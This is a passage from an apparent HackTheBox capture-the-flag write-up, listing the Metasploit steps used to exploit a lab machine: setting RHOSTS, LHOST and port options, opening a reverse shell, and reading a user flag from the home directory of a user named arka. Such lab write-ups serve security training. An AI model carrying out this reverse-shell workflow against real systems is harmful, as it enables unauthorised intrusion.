3. Selected the exploit with `use 0` and listed options to identify required flags.
4. Set the required flags:
   - `RHOSTS` → `10.129.3.211` (target IP from HackTheBox)
   - `LHOST` → `10.10.15.1` (local machine IP)
   - `SSL` → `false` (exploit runs over HTTP, not HTTPS)
   - `RPORT` → `80`
5. Ran the exploit and waited for Metasploit to complete.
6. Established a **reverse shell** on the compromised system.
7. Navigated to `/home`, identified **arka** as the only user.
8. `cd`'d to arka's home directory and `cat`'d `user.txt` to retrieve the flag.
